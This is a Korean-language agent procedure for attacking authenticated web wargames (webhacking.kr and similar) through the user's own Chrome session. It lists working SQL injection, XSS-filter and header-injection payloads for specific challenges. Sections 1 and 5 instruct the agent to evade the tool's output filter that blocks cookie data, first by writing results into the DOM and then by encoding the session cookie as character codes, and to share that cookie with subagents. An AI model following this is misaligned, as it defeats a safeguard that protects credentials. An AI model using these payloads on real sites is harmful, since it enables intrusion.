# Authenticated web wargame via claude-in-chrome (workspace procedure)

> 로컬 추가 문서. 사용자가 **이미 로그인해 둔** 웹 워게임/실습 사이트(webhacking.kr, root-me, los.rubiya 등)를
> claude-in-chrome(사용자의 실제 Chrome)으로 공략할 때의 실행 절차·함정. `ctf-web`의 기법은 그대로 쓰되,
> "라이브 인증 세션을 어떻게 다루는가"가 핵심이다. 2025-10 webhacking.kr 11문제 풀이로 검증.

## 0. 핵심 모델 — "탭은 양성 페이지, 요청은 fetch"
사용자 로그인 세션은 **사용자 Chrome의 쿠키 jar**에만 있다(HttpOnly PHPSESSID 포함). 세션을 추출하지 말고,
**페이지 컨텍스트에서 `fetch()`** 를 돌리면 same-origin 요청에 세션 쿠키가 자동 포함된다.

```js
// 탭을 챌린지 리스트 같은 "alert 없는 same-origin 페이지"에 두고:
await fetch('/challenge/web-01/', {credentials:'include'}).then(r=>r.text())
```

- `mcp__claude-in-chrome__navigate` 로 양성 페이지(예: `/chall.php`)에 한 번 가고, 이후 **그 탭에서 `javascript_tool`로
  fetch** 한다. 챌린지 페이지로 직접 navigate 하지 않는다(아래 alert 함정).
- 세션 공유 확인: 같은 Chrome 프로필이면 새 MCP 탭도 로그인 상태다(스크린샷 우상단 계정명으로 확인).

## 1. 함정과 우회 (실측)
- **alert()가 탭을 freeze 시킨다.** 챌린지 페이지를 navigate로 열면 `alert()`/`confirm()`이 탭-모달로 떠서
  이후 모든 MCP 명령이 timeout 된다. → **챌린지 페이지를 열지 말고 fetch로 소스만 받는다.** 이미 얼었으면
  `tabs_create_mcp`로 **새 탭**을 열어 거기서 작업한다(alert는 탭 단위 모달).
- **fetch 결과를 그대로 반환하면 MCP 출력 필터가 막는다.** `javascript_tool`은 반환값이 쿠키/base64/쿼리스트링
  처럼 보이면 `[BLOCKED: ...]` 로 가린다. → **소스 텍스트를 반환하지 말고** DOM에 `<pre>`로 심고 읽는다:
  ```js
  const t = await fetch(url,{credentials:'include'}).then(r=>r.text());
  const pre=document.createElement('pre'); pre.textContent=t;   // textContent → 스크립트 실행 안 됨
  document.body.innerHTML=''; document.body.appendChild(pre); 'len='+t.length
  ```
  그 다음 `get_page_text`로 읽는다. `javascript_tool`에서는 **계산된 상태 문자열만**(예: `SOLVED`/`fail`/길이) 반환.
- **소스 보기**: webhacking.kr은 `index.phps`가 403이다. `?view_source=1`(일부는 `?view-source=1`)로 본다.
  출력은 span 범벅이라 토큰 낭비 → DOMParser로 `code` 엘리먼트의 `.textContent`만 뽑아 심는다:
  ```js
  const d=new DOMParser().parseFromString(html,'text/html'); const code=d.querySelector('code')?.textContent;
  ```
- **여러 소스는 한 번에**: fetch들을 루프로 돌려 라벨 `<h2>`+`<pre>`로 쌓고 `get_page_text` 1회로 읽는다.
- **fetch는 금지 헤더를 못 넣는다.** `User-Agent`/`Referer`/`Cookie`(타 도메인) 등은 fetch로 설정 불가.
  **UA/Referer/헤더 주입형 챌린지**(webhacking.kr old-08 등)는 fetch로 못 푼다 → **curl+세션쿠키 브리지(§5)** 로 처리.

## 2. 쿠키 조작 (챌린지 자체 쿠키)
챌린지가 쓰는 비-HttpOnly 쿠키(user_lv, user, userid …)는 `document.cookie`로 직접 설정한다.
- **경로 주의**: 서버가 `path=/challenge/web-01/`로 심으면, 다른 경로에서 설정한 동명 쿠키와 **중복**되어 간섭한다.
  풀기 전 여러 경로에서 **삭제**(`expires=Thu, 01 Jan 1970`) 후 올바른 경로로만 설정한다.
- **PHP `setcookie()` 타이밍**: 설정은 그 요청이 아니라 **다음 요청**부터 반영된다. 서버가 GET 파라미터로
  쿠키를 덮어쓰면, **파라미터 없이** 페이지를 요청해 내가 심은 쿠키가 평가되게 한다(old-19).

## 3. webhacking.kr에서 검증된 기법 요약 (패턴 → 풀이)
| 챌린지 | 유형 | 핵심 |
|---|---|---|
| old-15 js-2 | JS/alert | alert+redirect가 막는 링크는 그냥 `?getFlag` 직접 GET |
| old-14 js-1 | JS 계산 | `document.URL.indexOf(".kr")=18` → `?291600` |
| old-16 js-3 | JS keycode | `cd==124('|')` → `/challenge/js-3/%7C.php` |
| old-17 js-4 | JS 난독산술 | `eval`로 unlock 계산 → `?unlock/10` |
| old-19 js-6 | 쿠키 | `userid=base64(concat md5(char) for id)`; 중복쿠키 제거+admin값 설정+파라미터 없이 요청 |
| old-01 web-01 | 쿠키 타입 | `user_lv`는 numeric이어야 하고 `>=4`면 리셋, `>3`이면 solve → `3.1` |
| old-06 web-06 | 쿠키 인코딩 | base64 20회 + 숫자→기호 치환한 admin/nimda 쿠키 |
| old-26 web-11 | 필터 | preg_match 후 `urldecode` 1회 → 이중인코딩 `?id=%2561dmin` |
| old-18 web-32 | SQLi | 공백·`()|&`·select/from 차단 → 개행 `%0a`로 `no=0 or id='admin'` |
| old-27 web-12 | SQLi | `#`·`(`·공백·`=`·select 차단 → `no=0)||id<'b'` + `--`＋**탭**(공백이 아닌 `\s`)으로 꼬리 `)` 주석 |
| old-07 web-07 | SQLi UNION | 공백(`\s`)·숫자2·`=`·from·`*`·`/` 차단, rand(1~5) 괄호 → `#` 주석, 값2는 `3^1`, `union(select(3^1))`, N별 페이로드를 루프로 rand에 맞춤 |
| old-54 bonus-14 | 정보노출 | `?m=i` 루프로 비밀번호 한 글자씩 수집 |

재사용 SQLi 조각:
- 공백 대체: `%0a`(개행)·`%09`(탭)·`/**/`(가능할 때). 필터가 리터럴 ` `만 막으면 개행/탭이 통과, `\s`면 전부 차단.
- 주석으로 꼬리 제거: `#`(공백 불필요) / `-- `+공백 / `-- `+탭(`\s` 미차단 시) / `/* */`.
- admin 행 고르기(=·공백 없이): `id<'b'`(알파벳 비교), `id like'admin'`, 서브쿼리.
- 숫자 리터럴 없이 값 만들기: 비트 `3^1=2`, 모듈로 `6%4=2`, 이진 `0b10`.
- 랜덤 괄호 중첩: N별 페이로드(`0`+`)`×N+`union(select(..))#`)를 루프로 보내 rand와 일치시킨다.

기타 필터/로직 우회(webhacking.kr 검증):
- **NUL 바이트로 글자런 끊기**: 필터가 `3글자+ 연속 알파벳`(script/alert…)을 막고 서버가 반사 전 `\x00`을 제거하면,
  `<s%00c%00r%00i%00p%00t>a%00l%00e%00r%00t(1)…` → 필터 통과, 출력은 정상 `<script>…` (old-23 XSS).
- **금지헤더 필요 챌린지는 curl**: `-e`(Referer), `-A`(User-Agent). old-10은 `?go=1600px`+Referer 필수, old-08은 UA 주입.
- **난독 JS**(aaencode `ﾟДﾟ`/jjencode)는 `Function`/`eval` 생성자를 가로채 디코드 → 조건 추출(old-12: `=youaregod~~~~~~~!`).
- **captcha+시간제한**: GET으로 per-load captcha 파싱 → **같은 세션**으로 즉시 POST(수 초 내) (old-20).
- **카운트/투표 게이트 쿠키**(`vote_check=ok` 등) 없이 보내면 매번 집계 → 루프로 목표치(old-32: `?hit=<me>` 100회).
- **regex 매칭형 파라미터**: 소스의 정규식을 그대로 만족시키되 `%09`(탭) 등으로 구분자 삽입, 서버가 보는 내 IP 포함(old-11).
- **멀티바이트 SQLi**: `addslashes`가 `'`→`\'`로 막아도, 이어서 멀티바이트 변환(`mb_convert_encoding(...,'utf-8','euc-kr')` 등)이
  선행 바이트(`%a1` 등)+`\`를 한 글자로 흡수해 `\`가 사라지고 `'`가 활성화된다 → `id=%a1' or id like 0x61646d696e#`
  (admin/select/= 차단은 hex `0x...`·`like`·`#`로 우회) (old-45).
- **미인용 숫자 컬럼 INSERT 주입**: `values('{id}','{ip}',{num})`처럼 숫자 필드가 인용 안 되면 거기로 2차 행을 넣는다
  → `num=1),('admin','<내IP>',1`. 주석문자가 전부 차단되면(`#`/`--`/`/* */`/`;`), **템플릿 꼬리 `)`에 맞춰 내 괄호를
  하나 덜 닫아** 균형을 맞춘다 (old-35).
- **vi 스왑파일 소스복구**: "편집 중 크래시/정전으로 소스가 사라졌다"류 힌트 → `.<name>.swp`·`.swo`·`<name>~`에 접근해
  원본을 복구한다(바이너리라 `strings`/printable-run 추출). 복구한 `FLAG{}`는 사람이 제출 (old-36).
- **클라이언트 전용 다운로드 차단 우회**: 막힌 다운로드가 `javascript:alert('Access Denied')` 같은 **클라 측**이면
  서버의 다운로드 파라미터를 직접 호출한다 — 보통 `?down=base64(파일명)`류. `?down=ZmxhZy5kb2N4`(="flag.docx").
  받은 `.docx`/`.xlsx`/`.pptx`는 zip이므로 `word/document.xml` 등에서 텍스트/플래그 추출 (old-42).
- **raw-binary MD5 SQLi (`ffifdyop`)**: `md5($pw, true)`(raw 바이트)를 따옴표 없이 `pw='{raw}'`에 넣는 코드엔
  `pw=ffifdyop`를 보낸다 — `md5('ffifdyop',true)`가 `'or'6␚...` 바이트를 포함해 `pw=''or'6...'`가 항상 참 (old-51).
- **overlong 파일명 → `copy()` 에러로 숨은 경로 노출**: 업로드가 미지의 디렉터리에 쓰는데 경로를 모르면, **255자 초과
  파일명**으로 `Warning: copy(./<secret_dir>/aaaa…): failed to open stream: File name too long`를 유발 → 에러가
  전체 목적지(비밀 업로드 디렉터리)를 출력한다. 그 경로로 업로드물 접근 (old-41).
- **숫자채널 블라인드 SQLi(출력되는 INSERT 컬럼)**: 삽입값이 나중에 화면에 echo되고 문자열 연결이 막히면
  `0'+(subquery)+'0`로 깨서 서브쿼리를 **숫자**(`ascii`/`length`/`count`)로 표시 → 한 글자씩 추출. WAF가 `,(`(멀티행·
  `concat()`)·`substr(`·`user()`·`limit a,b`에서 연결을 끊으면 **`mid(x FROM n FOR 1)`·`limit n offset m`**(콤마 없이),
  `/**/` 제거 시 실제 공백/괄호로 토큰 분리. information_schema로 테이블/컬럼 열거 (old-29).
- **인프라 게이트 SSRF/콜백(풀이 불가 판정)**: `fsockopen($host,port)` 성공이 솔브 조건이면 **공인 TCP 리스너**가
  필요하다. NAT 뒤·포트포워드 없음이면 불가(localhost.run류는 80/443만). 공용 리스너를 확보할 수 있을 때만 시도,
  아니면 NOTES에 "인프라 게이트"로 적고 넘어간다 (old-31, old-37).

## 4. 병렬 서브에이전트
- **순수 계산** 위임: 필터 역산(문자열 변환식의 역상 탐색 — old-24 IP 필터는 길이 20 페이로드를 서브에이전트가 전수탐색),
  크립토, 해시/인코딩 브루트포스, 디코딩.
- **라이브 인증 요청 병렬**(§5 브리지가 열려 있을 때): 세션쿠키를 **gitignored 세션파일**로 공유하면 서브에이전트도
  `curl`로 라이브 공략이 가능하다. **겹치지 않는 챌린지 클러스터**를 각 에이전트에 배정하고(중복/충돌·과요청 방지),
  각 에이전트에 세션파일 경로·`ctf-web`·이 문서를 주면 독립적으로 분석→익스플로잇→솔브까지 한다. 쿠키 **값**은
  프롬프트에 넣지 말고 파일 경로만 준다(에이전트가 읽게). 메인 세션은 또 다른 클러스터를 동시에 진행.

## 5. curl + 세션쿠키 브리지 (사용자 허락 하에)
브라우저 `fetch`의 금지 헤더 한계·출력 필터·직렬성을 넘기 위한 경로. **사용자가 세션쿠키 사용을 명시적으로 허락한
경우에만** 연다(사용자 본인의 워게임 세션, 본인 요청). 열면: 임의 헤더(UA/Referer) 주입, Bash 스크립트화,
**서브에이전트 병렬 라이브 요청**, MCP 출력필터 우회가 모두 가능해진다.

세션쿠키 획득(두 경로):
1. **사용자가 붙여넣기** — DevTools → Application → Cookies → PHPSESSID 값. 가장 깔끔.
2. **페이지에서 읽기** — PHPSESSID가 non-HttpOnly면 `document.cookie`에 보인다(키 목록으로 확인). 단 `javascript_tool`이
   원문 반환을 `[BLOCKED: Cookie data]`로 가리므로, **char-code로 변환해 받아** 로컬에서 복원한다(필터 우회가 아니라
   포맷 변경 — 사용자 허락 범위 내):
   ```js
   const m=document.cookie.match(/PHPSESSID=([^;]+)/);
   m ? ('len'+m[1].length+':'+[...m[1]].map(c=>c.charCodeAt(0)).join(',')) : 'httponly?'
   ```
   HttpOnly라면 이 경로는 불가 → 경로 1.

저장·사용(값은 채팅에 출력 금지, 커밋 금지):
```bash
# events/* 는 gitignore 되므로 세션파일을 거기 둔다
python -I -c "print(''.join(chr(int(x)) for x in '<codes>'.split(',')))" > /dev/null  # 복원
printf 'PHPSESSID=%s\n' "$SID" > events/<site>/.session && chmod 600 events/<site>/.session
SID=$(cut -d= -f2 events/<site>/.session)
curl -s -b "PHPSESSID=$SID" -A "Mozilla/5.0" https://site/chall.php | grep -qi 'Logout' && echo logged-in
# 헤더 주입 예(old-08): UA에 SQLi
curl -s -b "PHPSESSID=$SID" -A "zz9','1','admin')#" https://webhacking.kr/challenge/web-08/ >/dev/null
curl -s -b "PHPSESSID=$SID" -A "zz9"                 https://webhacking.kr/challenge/web-08/ | grep -i congratz
```
세션은 만료·로그아웃·재로그인 시 바뀌니, 실패가 늘면 세션파일을 갱신한다.

## 6. 범위·증거
- 대회/워게임이 지정한 챌린지 타깃만. 인증·랭킹 인프라, 다른 사용자, 무관 호스트 금지.
- 요청은 측정적으로(루프는 수십 회 이내, 폭주 금지).
- **솔브 방식 2가지**:
  1. **exploit 자동솔브** — 대부분의 old-* 챌린지는 조건 충족 시 서버가 `solve()`를 자동 호출(별도 제출 없음). 이건
     "플래그 제출"이 아니라 솔브 조건 달성이므로 자동화 OK.
  2. **FLAG{} 수동제출** — 일부는 `FLAG{...}`를 전역 폼으로 낸다(webhacking.kr은 `POST /auth.php` JSON `{"flag":...}`).
     이건 **플래그 제출**이므로 **사람이 한다**(no-auto-submit 규칙). 복구/계산한 FLAG를 사용자에게 넘긴다.
- IP 함정: 사이트가 프록시 뒤면 **로그/표시 IP(XFF)** 와 **서버 체크 IP(REMOTE_ADDR)** 가 다를 수 있다(old-38 로그인젝션).
- 진행은 챌린지 `work/`·events NOTES에 가설/사실/다음으로 기록.
